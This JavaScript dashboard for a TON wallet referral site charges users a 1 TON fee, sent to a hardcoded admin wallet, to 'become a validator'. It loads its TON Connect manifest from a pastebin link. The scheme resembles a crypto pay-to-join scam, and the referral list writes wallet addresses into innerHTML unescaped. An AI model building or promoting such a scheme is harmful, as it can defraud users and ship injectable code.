// Configuration
const ADMIN_WALLET = "UQAmD1ygHFoJrGqa8P-vrakFq8A7PR7DnKfCBApknO6N_TOv";
const POC_AMOUNT = "1000000000"; // 1 TON in nanotons

// Initialize TON Connect
let tonConnectUI;

// Main initialization
document.addEventListener('DOMContentLoaded', async () => {
    const token = localStorage.getItem('auth_token');
    if (!token) {
        window.location.href = '/';
        return;
    }

    // Initialize TON Connect
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://pastebin.com/raw/swi6Dwxq',
        buttonRootId: 'ton-connect',
        
    });

    // Handle disconnect
    tonConnectUI.onStatusChange(async (wallet) => {
        if (!wallet) {
            localStorage.removeItem('auth_token');
            window.location.href = '/';
        }
    });

    window.addEventListener('ton-wallet-disconnected', () => {
        localStorage.removeItem('auth_token');
        window.location.href = '/';
    });

    // Load initial data
    await loadDashboardData();

    // Add transaction event listeners
    setupTransactionEventListeners();
});

function setupTransactionEventListeners() {
    window.addEventListener('ton-connect-ui-transaction-sent-for-signature', (event) => {
        console.log('Transaction sent for signature:', event.detail);
    });

    window.addEventListener('ton-connect-ui-transaction-signed', (event) => {
        console.log('Transaction signed successfully:', event.detail);
    });

    window.addEventListener('ton-connect-ui-transaction-signing-failed', (event) => {
        console.log('Transaction signing failed:', event.detail);
    });

    // Tambahkan event listener untuk wallet disconnect
    window.addEventListener('ton-connect-ui-connection-lost', (event) => {
        console.log('Connection lost:', event.detail);
        localStorage.removeItem('auth_token');
        window.location.href = '/';
    });

    // Tambahkan event untuk error koneksi
    window.addEventListener('ton-connect-ui-connection-error', (event) => {
        console.log('Connection error:', event.detail);
        localStorage.removeItem('auth_token');
        window.location.href = '/';
    });
}

async function loadDashboardData() {
    try {
        const token = localStorage.getItem('auth_token');
        const response = await fetch('/dashboard/data', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        if (response.status === 401) {
            localStorage.removeItem('auth_token');
            window.location.href = '/';
            return;
        }

        const data = await response.json();
        updateDashboard(data);
    } catch (error) {
        console.error('Failed to load dashboard:', error);
    }
}

function updateDashboard(data) {
    // Update referral link
    const referralLink = `${window.location.origin}?ref=${data.user.referral_code}`;
    document.getElementById('referralLink').value = referralLink;

    // Update total referrals
    document.getElementById('totalReferrals').textContent = data.referrals.length;

    // Update validator status
    updateValidatorUI(data.user);

    // Update referrals list
    updateReferralsList(data.referrals);
}

async function handleBecomeValidator() {
    try {
        // Check if wallet is connected
        const isConnected = tonConnectUI.connected;
        if (!isConnected) {
            alert('Please connect your wallet first');
            return;
        }

        // Get current wallet info
        const currentWalletInfo = tonConnectUI.walletInfo;
        console.log('Connected wallet:', currentWalletInfo);

        // Prepare transaction
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60 * 60,
            messages: [
                {
                    address: ADMIN_WALLET,
                    amount: POC_AMOUNT,
                }
            ]
        };

        console.log('Sending transaction:', transaction);

        // Send transaction and wait for result
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction result:', result);

        // Get transaction hash from result
        let txHash;
        if (result && result.boc) {
            txHash = result.boc;
        } else if (typeof result === 'string') {
            txHash = result;
        } else {
            throw new Error('Invalid transaction result');
        }

        console.log('Using transaction hash:', txHash);

        // Update validator status on backend
        const response = await fetch('/dashboard/activate-validator', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
            },
            body: JSON.stringify({ txHash })
        });

        const responseData = await response.json();

        if (!response.ok) {
            throw new Error(responseData.details || 'Failed to activate validator');
        }

        if (responseData.success) {
            console.log('Validator activated successfully');
            await loadDashboardData(); // Refresh dashboard data
        } else {
            throw new Error(responseData.message || 'Failed to activate validator');
        }

    } catch (error) {
        console.error('Error in handleBecomeValidator:', error);
        alert(`Failed to process validator transaction: ${error.message}`);
    }
}

function updateValidatorUI(userData) {
    try {
        const status = document.getElementById('validatorStatus');
        const statusText = document.getElementById('validatorStatusText');
        const button = document.getElementById('becomeValidatorBtn');
        const txInfo = document.getElementById('txInfo');
        const txHash = document.getElementById('txHash');

        if (!status || !statusText || !button) {
            console.error('Required DOM elements not found');
            return;
        }

        if (userData.validator_status) {
            status.className = 'px-4 py-1 rounded-full text-sm bg-green-500/20 text-green-500';
            status.textContent = 'Active';
            statusText.textContent = 'Validator Active';
            button.classList.add('hidden');
            
            if (userData.poc_tx_hash) {
                txInfo.classList.remove('hidden');
                txHash.textContent = userData.poc_tx_hash;
            }
        } else {
            status.className = 'px-4 py-1 rounded-full text-sm bg-yellow-500/20 text-yellow-500';
            status.textContent = 'Not Active';
            statusText.textContent = 'Validator Not Active';
            button.classList.remove('hidden');
        }
    } catch (error) {
        console.error('Error updating validator UI:', error);
    }
}

function copyReferralLink() {
    const linkInput = document.getElementById('referralLink');
    const copyIcon = document.getElementById('copyIcon');
    const checkIcon = document.getElementById('checkIcon');

    navigator.clipboard.writeText(linkInput.value).then(() => {
        copyIcon.classList.add('hidden');
        checkIcon.classList.remove('hidden');

        setTimeout(() => {
            copyIcon.classList.remove('hidden');
            checkIcon.classList.add('hidden');
        }, 2000);
    }).catch(err => {
        console.error('Failed to copy:', err);
    });
}

function updateReferralsList(referrals) {
    const referralsList = document.getElementById('referralsList');
    
    if (referrals.length === 0) {
        referralsList.innerHTML = `
            <tr>
                <td colspan="2" class="text-center py-4 text-gray-400">No referrals yet</td>
            </tr>
        `;
    } else {
        // Mengambil 5 data terakhir dengan slice(-5)
        const lastFiveReferrals = referrals.slice(-5);
        
        referralsList.innerHTML = lastFiveReferrals.map(ref => `
            <tr class="border-t border-gray-800">
                <td class="py-4 font-mono text-sm">${ref.wallet_address}</td>
                <td class="py-4 text-gray-400">${new Date(ref.created_at).toLocaleDateString()}</td>
            </tr>
        `).join('');
    }
}

// Handle transaction status tracking
window.addEventListener('ton-connect-ui-connection-restored', (event) => {
    console.log('Connection restored:', event.detail);
});

window.addEventListener('ton-connect-ui-connection-error', (event) => {
    console.log('Connection error:', event.detail);
});